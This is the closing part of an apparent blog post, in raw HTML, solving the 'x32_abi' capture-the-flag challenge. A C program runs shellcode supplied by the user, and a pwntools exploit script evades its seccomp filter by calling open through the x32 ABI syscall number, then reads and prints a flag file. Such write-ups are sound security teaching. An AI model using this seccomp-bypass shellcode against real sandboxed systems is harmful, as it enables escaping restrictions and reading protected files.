  <span class="token function">filter_syscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Run shellcode from user */</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me some shellcode to execute :) "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword keyword-int">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>ret<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword keyword-int">int</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">;</span>
  <span class="token function">ret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-python"><code class=" language-python" data-lang="python"><span class="token comment">#!/usr/bin/python</span>
<span class="token keyword keyword-from">from</span> pwn <span class="token keyword keyword-import">import</span> <span class="token operator">*</span>

e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./x32_abi"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> e<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./x32_abi"</span>

sh  <span class="token operator">=</span> <span class="token triple-quoted-string string">'''   
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e /* ./flag in little_endian */
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push 0x40000002 /* Using 0x40000002 instead of 0x2 to bypass SECCOMP */
    pop rax
    syscall
'''</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token string">'rax'</span><span class="token punctuation">)</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div>
      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr>
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/posts/x32_abi_challenge-post-1/">
                <span class="button__icon">←</span>
                <span class="button__text">X32_abi_Challenge</span>
            </a>
        </span>
        
        
    </div>
</div>

  

  
  

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>



</body></html>
```
